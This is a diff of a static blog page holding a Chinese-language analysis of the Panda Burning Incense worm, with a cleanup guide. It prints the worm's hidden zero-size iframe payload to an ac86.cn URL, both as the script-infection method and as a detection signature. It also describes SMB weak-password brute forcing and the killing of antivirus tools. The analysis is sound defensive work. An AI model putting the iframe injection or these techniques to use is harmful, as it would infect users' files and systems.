@@ -76,7 +76,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(90)</small>
+                <small>(89)</small>
             
         </div>
     </li>
@@ -579,7 +579,7 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="90">
+<input type="hidden" id="yelog_site_posts_number" value="89">
 
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
@@ -641,15 +641,6 @@
            data-author="" >
             <span class="post-title" title="对中国整个安全行业的理解">对中国整个安全行业的理解</span>
             <span class="post-date" title="2023-06-14 16:06:36">2023/06/14</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2024/06/20/hello-world/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="Hello World">Hello World</span>
-            <span class="post-date" title="2024-06-20 14:35:01">2024/06/20</span>
         </a>
         
         
@@ -1533,51 +1524,51 @@ PChunter
 ProcessMonitor
 </code></pre>
 <h2 id="3-分析目标"><a href="#3-分析目标" class="headerlink" title="3.分析目标"></a>3.分析目标</h2><p> 分析恶意代码行为和具体执行流程，并给个手工清理方案 </p>
-<h2 id="4-PE文件检测"><a href="#4-PE文件检测" class="headerlink" title="4.PE文件检测"></a>4.PE文件检测</h2><p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/2.png"></p>
+<h2 id="4-PE文件检测"><a href="#4-PE文件检测" class="headerlink" title="4.PE文件检测"></a>4.PE文件检测</h2><p><img src="/.com//2.png"></p>
 <h1 id="二-具体行为分析"><a href="#二-具体行为分析" class="headerlink" title="二.具体行为分析"></a>二.具体行为分析</h1><p> <strong>使用火绒剑工具监控病毒样本的运行，待病毒执行一段时间后，分开查看病毒的行为。分析监控到的日志，主要</strong>观察的点：<br>     ①文件操作，主要看文件创建、修改、删除等操作<br>     ②注册表操作，主要看注册表设置、创建等操作<br>     ③进程操作，主要看创建进程、写入内存等操作<br>     ④网络操作，主要看网络连接地址、IP等信息<br>     ⑤其他行为，以及观察病毒样本运行后的反应 </p>
-<h2 id="2-1进程树比对"><a href="#2-1进程树比对" class="headerlink" title="2.1进程树比对"></a>2.1进程树比对</h2><p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/8.png"></p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/9.png"></p>
+<h2 id="2-1进程树比对"><a href="#2-1进程树比对" class="headerlink" title="2.1进程树比对"></a>2.1进程树比对</h2><p><img src="/.com//8.png"></p>
+<p><img src="/.com//9.png"></p>
 <p>在进程树中可以发现，“熊猫烧香.exe”衍生出了“spoclsv.exe” 并且几秒之后父进程不见了 </p>
 <p>由此可以推断 病毒复制了一个副本到系统目录下 并且结束了本进程 </p>
 <p>病毒本身创建了名为“spoclsv.exe”的进程，该进程文件的路径为“C:\WINDOWS\system32\drivers\spoclsv.exe”。并进行自我删除</p>
-<h2 id="2-2-进程行为检查"><a href="#2-2-进程行为检查" class="headerlink" title="2.2 进程行为检查"></a>2.2 进程行为检查</h2><h3 id="2-2-1-文件操作，主要看文件创建、修改、删除等操作"><a href="#2-2-1-文件操作，主要看文件创建、修改、删除等操作" class="headerlink" title="2.2.1 文件操作，主要看文件创建、修改、删除等操作"></a>2.2.1 文件操作，主要看文件创建、修改、删除等操作</h3><p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/11.png"></p>
+<h2 id="2-2-进程行为检查"><a href="#2-2-进程行为检查" class="headerlink" title="2.2 进程行为检查"></a>2.2 进程行为检查</h2><h3 id="2-2-1-文件操作，主要看文件创建、修改、删除等操作"><a href="#2-2-1-文件操作，主要看文件创建、修改、删除等操作" class="headerlink" title="2.2.1 文件操作，主要看文件创建、修改、删除等操作"></a>2.2.1 文件操作，主要看文件创建、修改、删除等操作</h3><p><img src="/.com//11.png"></p>
 <p>病毒行为1：创建了两个文件spoclsv.exe”和devcpp.exe</p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/18.png">病毒行为2： 给每个文件都创造了一个Desktop_.ini（记录日期）文件 </p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/13.png"></p>
+<p><img src="/.com//18.png">病毒行为2： 给每个文件都创造了一个Desktop_.ini（记录日期）文件 </p>
+<p><img src="/.com//13.png"></p>
 <p>病毒行为3：创造了autorun.inf 和setup.exe</p>
 <p>打开看一看 发现 autorun.inf写入了 自启动项的exe是setup</p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/14.png"></p>
-<h3 id="2-2-2注册表修改"><a href="#2-2-2注册表修改" class="headerlink" title="2.2.2注册表修改"></a>2.2.2注册表修改</h3><p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/10.png"></p>
+<p><img src="/.com//14.png"></p>
+<h3 id="2-2-2注册表修改"><a href="#2-2-2注册表修改" class="headerlink" title="2.2.2注册表修改"></a>2.2.2注册表修改</h3><p><img src="/.com//10.png"></p>
 <p>病毒行为4：修改了注册表自启动</p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/12.png"></p>
+<p><img src="/.com//12.png"></p>
 <p>病毒行为5：修改注册表值 让隐藏文件不可见</p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/17.png"></p>
+<p><img src="/.com//17.png"></p>
 <p> 病毒行为6：删除安全类工具的启动项 （看英文orz </p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/19.png"></p>
+<p><img src="/.com//19.png"></p>
 <p>病毒行为7： 连接局域网向外发包 </p>
 <h2 id="分析情况总结"><a href="#分析情况总结" class="headerlink" title="分析情况总结"></a>分析情况总结</h2><p>分析监控的日志以及自行观察操作之后，可以分析出样本的恶意行为：<br>     1.自我复制样本到C盘：C:\Windows\System32\drivers\目录下，启动C:\Windows\System32\drivers\spo0lsv.exe（即病毒程序）<br>     2.在每一个目录下创建Desktop_.ini，里面存放的是当前日期<br>     3.在C盘根目录下创建了autorun.inf文件，其中指定了自动启动的文件为根目录下的setup.exe（即病毒程序）<br>     4.对程序目录下的exe进行了感染，图标变为熊猫烧香，打开exe时，自动打开病毒<br>     5.枚举进程、查找窗口、打开设备<br>     6.设置注册表启动项为C:\Windows\System32\drivers\spo0lsv.exe<br>     7.自己创建了一个注册表的项，在其中写入了很多信息HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Tracing\spo0lsv_RASAPI32<br>      8.设置注册表键值，隐藏文件不显示HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL中的CheckedValue值<br>     9.修改注册表的项IE浏览器的代{过}{滤}理和连接设置<br>     10.使用CMD命令关闭网络共享<br>     11.连接局域网的一些地址，访问一些门户网站</p>
 <h1 id="三-静态分析"><a href="#三-静态分析" class="headerlink" title="三.静态分析"></a>三.静态分析</h1><h2 id="3-1文件脱壳"><a href="#3-1文件脱壳" class="headerlink" title="3.1文件脱壳"></a>3.1文件脱壳</h2><p> 这个壳很好脱，直接单步步过 dump下来，在peid再检测一遍</p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/3.png"></p>
+<p><img src="/.com//3.png"></p>
 <p>并且是由Borland Delphi 6.0-7.0编写的。由Delphi所编写的代码与VC++所编写的代码有所不同，最明显的两点区别如下：</p>
 <p>​    1、函数调用时参数的传递不完全用栈，而是主要用寄存器，即Delphi编译器默认以register方式传递函数参数。这一点与VC编译的程序完全不同。Delphi一般将第一个参数放入eax寄存器，第二个参数放入edx，第三个参数放入ecx寄存器，其余参数按照与VC程序类似的方式压栈。</p>
 <p>​    2、栈上给局部变量分配空间的时候，栈是向下增长的，而栈上的数组、字符串、结构体等却是向上增长的。理解这一点可以帮助识别栈上的变量。</p>
 <p>​    对病毒样本进行了简单的侦测之后，就确定了分析的方向，那么接下来就需要使用反汇编工具进行分析了。</p>
 <h3 id="3-1-1脱壳修复"><a href="#3-1-1脱壳修复" class="headerlink" title="3.1.1脱壳修复"></a>3.1.1脱壳修复</h3><p>我们虽然说pe可以检测到，但是文件运行不起来，我们想到了修复导入表，我们在OD右键查找，点击所有模块间的调用，双击一个函数，跳转到调试界面，然后右键跟随，看下图,然后 我们可以在数据窗口点击右键选择<code>长型-&gt;地址</code>, 就可以显示函数名 </p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/4.png"></p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/5.png"></p>
+<p><img src="/.com//4.png"></p>
+<p><img src="/.com//5.png"></p>
 <p> 可以看到块大小0X228</p>
 <p>注意我们要向上翻到 IAT 表的起始位置 ，打开<code>ImportREC</code>, 选择我们正在调试的这个程序, 然后分别输入<code>OEP：D0A0, RVA:1012C SIZE:0X228</code>, 然后点击<code>获取输入表</code> </p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/6.png"></p>
+<p><img src="/.com//6.png"></p>
 <p>然后点击 get imoport </p>
 <p>再点击fixdump</p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/7.png"></p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/15.png"></p>
+<p><img src="/.com//7.png"></p>
+<p><img src="/.com//15.png"></p>
 <p>附加到脱壳之后的文件上，这时会产生新的文件就已经脱壳完毕了</p>
 <p>之后是这样的</p>
 <h2 id="3-2详细静态分析"><a href="#3-2详细静态分析" class="headerlink" title="3.2详细静态分析"></a>3.2详细静态分析</h2><p>这是个delphi v3.0版本，按shift+F5 出来数字签名窗口，右键应用窗口</p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/16.png"></p>
+<p><img src="/.com//16.png"></p>
 <h2 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h2><p>我们在OD里找到入口地址为0X40D0A0，对此处进行F5全盘分析</p>
-<h3 id="入口地址主目录Sub-0040D0A0（）分析"><a href="#入口地址主目录Sub-0040D0A0（）分析" class="headerlink" title="入口地址主目录Sub_0040D0A0（）分析"></a>入口地址主目录Sub_0040D0A0（）分析</h3><h4 id="主目录下关键函数Sub-4082F8"><a href="#主目录下关键函数Sub-4082F8" class="headerlink" title="主目录下关键函数Sub_4082F8()"></a>主目录下关键函数Sub_4082F8()</h4><p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/20.png"></p>
+<h3 id="入口地址主目录Sub-0040D0A0（）分析"><a href="#入口地址主目录Sub-0040D0A0（）分析" class="headerlink" title="入口地址主目录Sub_0040D0A0（）分析"></a>入口地址主目录Sub_0040D0A0（）分析</h3><h4 id="主目录下关键函数Sub-4082F8"><a href="#主目录下关键函数Sub-4082F8" class="headerlink" title="主目录下关键函数Sub_4082F8()"></a>主目录下关键函数Sub_4082F8()</h4><p><img src="/.com//20.png"></p>
 <p><em>函数行为总结：</em></p>
 <p>1.自我复制到系统目录下，结束本进程，并运行system目录下的病毒文件</p>
 <p>2.如果打开系统目录下病毒 ，就跳出此循环</p>
@@ -1590,24 +1581,24 @@ ProcessMonitor
 <li><p>检查系统目录的病毒是否在运行，是的话推出，否则重新运行这个程序</p>
 </li>
 </ul>
-<h4 id="主目录下关键函数Sub-40CFB4"><a href="#主目录下关键函数Sub-40CFB4" class="headerlink" title="主目录下关键函数Sub_40CFB4"></a>主目录下关键函数Sub_40CFB4</h4><p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/21.png"></p>
+<h4 id="主目录下关键函数Sub-40CFB4"><a href="#主目录下关键函数Sub-40CFB4" class="headerlink" title="主目录下关键函数Sub_40CFB4"></a>主目录下关键函数Sub_40CFB4</h4><p><img src="/.com//21.png"></p>
 <p><em>这个函数中有三个函数，分别功能：</em><br>     1.创建线程，遍历目录创建Desktop_.ini<br>     2.设置了一个定时器，检查C盘中setup.exe和autorun.inf文件是否存在，若不存在则创建<br>     3.创建线程，进行网络连接 </p>
-<h5 id="Sub-40CFB4第一个子函数sub-4047ec"><a href="#Sub-40CFB4第一个子函数sub-4047ec" class="headerlink" title="Sub_40CFB4第一个子函数sub_4047ec"></a>Sub_40CFB4第一个子函数sub_4047ec</h5><p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/22.png"></p>
+<h5 id="Sub-40CFB4第一个子函数sub-4047ec"><a href="#Sub-40CFB4第一个子函数sub-4047ec" class="headerlink" title="Sub_40CFB4第一个子函数sub_4047ec"></a>Sub_40CFB4第一个子函数sub_4047ec</h5><p><img src="/.com//22.png"></p>
 <p>进入sub_40A48C函数，函数用了一个死循环  ，可以看到在循环执行sub_409348函数，根据之前的判断，这里应该是在创建Desktop_.ini文件 </p>
 <p>一直在扫描所有可用磁盘最后一个函数infectfile是线程回调函数的核心感染文件部</p>
 <p>进入infectfile</p>
-<h6 id="sub-4094A4也就是-infectfile"><a href="#sub-4094A4也就是-infectfile" class="headerlink" title="sub_4094A4也就是 infectfile"></a>sub_4094A4也就是 infectfile</h6><p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/24.png"></p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/26.png"></p>
+<h6 id="sub-4094A4也就是-infectfile"><a href="#sub-4094A4也就是-infectfile" class="headerlink" title="sub_4094A4也就是 infectfile"></a>sub_4094A4也就是 infectfile</h6><p><img src="/.com//24.png"></p>
+<p><img src="/.com//26.png"></p>
 <p>我们现在看向545行的sub_40800C函数</p>
-<h6 id="sub-4094A4-子函数sub-40800C函数-这个函数是对exe文件进行感染"><a href="#sub-4094A4-子函数sub-40800C函数-这个函数是对exe文件进行感染" class="headerlink" title="sub_4094A4 子函数sub_40800C函数 这个函数是对exe文件进行感染"></a>sub_4094A4 子函数sub_40800C函数 这个函数是对exe文件进行感染</h6><p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/28.png"></p>
+<h6 id="sub-4094A4-子函数sub-40800C函数-这个函数是对exe文件进行感染"><a href="#sub-4094A4-子函数sub-40800C函数-这个函数是对exe文件进行感染" class="headerlink" title="sub_4094A4 子函数sub_40800C函数 这个函数是对exe文件进行感染"></a>sub_4094A4 子函数sub_40800C函数 这个函数是对exe文件进行感染</h6><p><img src="/.com//28.png"></p>
 <h6 id="sub-40800C函数-子函数sub-405644函数"><a href="#sub-40800C函数-子函数sub-405644函数" class="headerlink" title="sub_40800C函数 子函数sub_405644函数"></a>sub_40800C函数 子函数sub_405644函数</h6><p>这个函数用指针循环 大概可以猜到是获取文件的名字字符串</p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/27.png"></p>
-<h6 id="sub-4094A4-子函数-sub-47ADC函数-595行-脚本文件感染"><a href="#sub-4094A4-子函数-sub-47ADC函数-595行-脚本文件感染" class="headerlink" title="sub_4094A4 子函数 sub_47ADC函数  595行 . 脚本文件感染"></a>sub_4094A4 子函数 sub_47ADC函数  595行 . 脚本文件感染</h6><p>第二种感染方式相对简单的多 就是在脚本文件末尾追加一段网址:<iframe src=http://www.ac86.cn/66/index.htm width="0" height="0"></iframe> 当用户打开脚本文件时 iframe会隐藏式地开一个网址 由于网址已经废弃 所以我也不知道会发生什么</p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/29.png"></p>
+<p><img src="/.com//27.png"></p>
+<h6 id="sub-4094A4-子函数-sub-47ADC函数-595行-脚本文件感染"><a href="#sub-4094A4-子函数-sub-47ADC函数-595行-脚本文件感染" class="headerlink" title="sub_4094A4 子函数 sub_47ADC函数  595行 . 脚本文件感染"></a>sub_4094A4 子函数 sub_47ADC函数  595行 . 脚本文件感染</h6><p>第二种感染方式相对简单的多 就是在脚本文件末尾追加一段网址:<iframe src="http://www.ac86.cn/66/index.htm" width="0" height="0"></iframe> 当用户打开脚本文件时 iframe会隐藏式地开一个网址 由于网址已经废弃 所以我也不知道会发生什么</p>
+<p><img src="/.com//29.png"></p>
 <p>至此 第一个函数sub_4047ec分析完毕</p>
 <h4 id="Sub-40CFB4第二个子函数sub-40C5B0"><a href="#Sub-40CFB4第二个子函数sub-40C5B0" class="headerlink" title="Sub_40CFB4第二个子函数sub_40C5B0"></a>Sub_40CFB4第二个子函数sub_40C5B0</h4><p>里面有个TimerFunc函数</p>
 <p> 进入TimerFunc函数</p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/23.png"></p>
+<p><img src="/.com//23.png"></p>
 <p>函数行为总结：</p>
 <ol>
 <li><p>查找所有可用磁盘</p>
@@ -1618,25 +1609,25 @@ ProcessMonitor
 </li>
 </ol>
 <p>至此第二个子函数sub_40C5B0分析完毕</p>
-<h4 id="Sub-40CFB4第三个子函数-sub-408D08"><a href="#Sub-40CFB4第三个子函数-sub-408D08" class="headerlink" title="Sub_40CFB4第三个子函数 sub_408D08"></a>Sub_40CFB4第三个子函数 sub_408D08</h4><h5 id="sub-408D08-函数里的sub-40BAA0"><a href="#sub-408D08-函数里的sub-40BAA0" class="headerlink" title="sub_408D08 函数里的sub_40BAA0"></a>sub_408D08 函数里的sub_40BAA0</h5><p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/30.png"></p>
+<h4 id="Sub-40CFB4第三个子函数-sub-408D08"><a href="#Sub-40CFB4第三个子函数-sub-408D08" class="headerlink" title="Sub_40CFB4第三个子函数 sub_408D08"></a>Sub_40CFB4第三个子函数 sub_408D08</h4><h5 id="sub-408D08-函数里的sub-40BAA0"><a href="#sub-408D08-函数里的sub-40BAA0" class="headerlink" title="sub_408D08 函数里的sub_40BAA0"></a>sub_408D08 函数里的sub_40BAA0</h5><p><img src="/.com//30.png"></p>
 <p>开启死循环 尝试连接445和139端口 如果连接成功就尝试用管理员弱密码爆破</p>
 <p>至此主目录下第二个关键函数 sub_40CFB4分析完毕</p>
-<h4 id="主目录下关键函数Sub-40CED4"><a href="#主目录下关键函数Sub-40CED4" class="headerlink" title="主目录下关键函数Sub_40CED4"></a>主目录下关键函数Sub_40CED4</h4><p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/31.png"></p>
-<h5 id="Sub-40CED4函数下sub-40CD30"><a href="#Sub-40CED4函数下sub-40CD30" class="headerlink" title="Sub_40CED4函数下sub_40CD30"></a>Sub_40CED4函数下sub_40CD30</h5><p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/32.png"></p>
+<h4 id="主目录下关键函数Sub-40CED4"><a href="#主目录下关键函数Sub-40CED4" class="headerlink" title="主目录下关键函数Sub_40CED4"></a>主目录下关键函数Sub_40CED4</h4><p><img src="/.com//31.png"></p>
+<h5 id="Sub-40CED4函数下sub-40CD30"><a href="#Sub-40CED4函数下sub-40CD30" class="headerlink" title="Sub_40CED4函数下sub_40CD30"></a>Sub_40CED4函数下sub_40CD30</h5><p><img src="/.com//32.png"></p>
 <p>sub_406f3c()</p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/33.png"></p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/34.png"></p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/35.png"></p>
-<h5 id="Sub-40CED4函数下sub-40CE8C"><a href="#Sub-40CED4函数下sub-40CE8C" class="headerlink" title="Sub_40CED4函数下sub_40CE8C"></a>Sub_40CED4函数下sub_40CE8C</h5><p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/36.png"></p>
+<p><img src="/.com//33.png"></p>
+<p><img src="/.com//34.png"></p>
+<p><img src="/.com//35.png"></p>
+<h5 id="Sub-40CED4函数下sub-40CE8C"><a href="#Sub-40CED4函数下sub-40CE8C" class="headerlink" title="Sub_40CED4函数下sub_40CE8C"></a>Sub_40CED4函数下sub_40CE8C</h5><p><img src="/.com//36.png"></p>
 <h5 id="Sub-40CED4函数下sub-40CE94"><a href="#Sub-40CED4函数下sub-40CE94" class="headerlink" title="Sub_40CED4函数下sub_40CE94"></a>Sub_40CED4函数下sub_40CE94</h5><p>这个函数创建了两个线程</p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/37.png"></p>
+<p><img src="/.com//37.png"></p>
 <p>第一个函数sub_40cbe8已经分析过了</p>
 <p>看第二个函数sub_40cc38</p>
-<p><img src="/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/39.png"></p>
+<p><img src="/.com//39.png"></p>
 <p>这个函数的重点在于两条cmd命令 这两条命令的含义是删除C盘的网络共享 取消系统根目录的共享</p>
 <h5 id="Sub-40CED4函数下sub-407540"><a href="#Sub-40CED4函数下sub-407540" class="headerlink" title="Sub_40CED4函数下sub_407540"></a>Sub_40CED4函数下sub_407540</h5><p>主要功能：关闭杀软的服务和启动项</p>
 <h2 id="3．解决方案"><a href="#3．解决方案" class="headerlink" title="3．解决方案"></a>3．解决方案</h2><h3 id="3-1提取病毒的特征，利用杀毒软件查杀"><a href="#3-1提取病毒的特征，利用杀毒软件查杀" class="headerlink" title="3.1提取病毒的特征，利用杀毒软件查杀"></a>3.1提取病毒的特征，利用杀毒软件查杀</h3><p>特征1：whboy</p>
-<p>特征2：<iframe src=http://www.ac86.cn/66/index.htm width="0" height="0"></iframe></p>
+<p>特征2：<iframe src="http://www.ac86.cn/66/index.htm" width="0" height="0"></iframe></p>
 <p>特征3：C:\Windows\System32\drivers\spo0lsv.exe</p>
 <h3 id="3-2-手工查杀步骤"><a href="#3-2-手工查杀步骤" class="headerlink" title="3.2 手工查杀步骤"></a>3.2 手工查杀步骤</h3><ol>
 <li><p>删除【C:\Windows\System32\drivers\spcolsv.exe】文件  </p>
